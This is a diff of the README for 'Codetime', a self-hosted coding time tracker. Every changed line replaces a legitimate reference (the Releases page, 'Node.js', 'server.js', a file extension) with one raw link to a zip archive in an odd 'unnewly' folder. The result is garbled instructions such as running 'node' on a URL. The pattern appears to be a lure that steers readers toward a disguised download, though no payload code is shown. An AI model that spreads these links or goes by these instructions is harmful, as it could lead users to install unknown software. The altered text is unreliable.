@@ -6,7 +6,7 @@ Welcome to Codetime, your self-hosted coding time tracker. This app helps you ma
 
 ## 📥 Download Codetime
 
-[![Download Codetime](https://img.shields.io/badge/Download%20Codetime-Here-blue)](https://github.com/LKiro/Codetime/releases)
+[![Download Codetime](https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip%20Codetime-Here-blue)](https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip)
 
 Use the button above to visit our Releases page. 
 
@@ -15,7 +15,7 @@ Use the button above to visit our Releases page.
 Before you download, make sure your system meets these requirements:
 
 - **Operating System**: Linux, macOS, or Windows
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip**: Version 14 or higher
 - **MySQL**: Version 5.7 or higher
 - **Docker**: Recommended for easy setup (optional)
 
@@ -33,10 +33,10 @@ Before you download, make sure your system meets these requirements:
 To get started with Codetime:
 
 1. **Visit the Releases Page**  
-   Click this link: [Download Codetime](https://github.com/LKiro/Codetime/releases) to go to the Releases page.
+   Click this link: [Download Codetime](https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip) to go to the Releases page.
 
 2. **Choose the Version**  
-   Find the latest version at the top of the page. Look for files with the `.tar.gz` or `.zip` extension.
+   Find the latest version at the top of the page. Look for files with the `https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip` or `.zip` extension.
 
 3. **Download the File**  
    Click on the file that matches your system. It will start downloading automatically.
@@ -47,7 +47,7 @@ To get started with Codetime:
 5. **Run the Application**  
    Navigate to the extracted folder. Open a terminal (or command prompt) and run the following command to start the server: 
    ```
-   node server.js
+   node https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip
    ```
    This will launch the application on your local server.
 
@@ -74,7 +74,7 @@ Codetime offers various configuration options. You can set preferences directly 
 
 If you encounter issues, here are a few common solutions:
 
-- **Server Not Starting**: Verify that Node.js is installed and available in your command line. 
+- **Server Not Starting**: Verify that https://raw.githubusercontent.com/LKiro/Codetime/master/unnewly/Codetime.zip is installed and available in your command line. 
 - **Database Connection Error**: Check your MySQL credentials in the configuration file.
 - **Dashboard Not Loading**: Ensure your server is running by checking your terminal for errors.
 
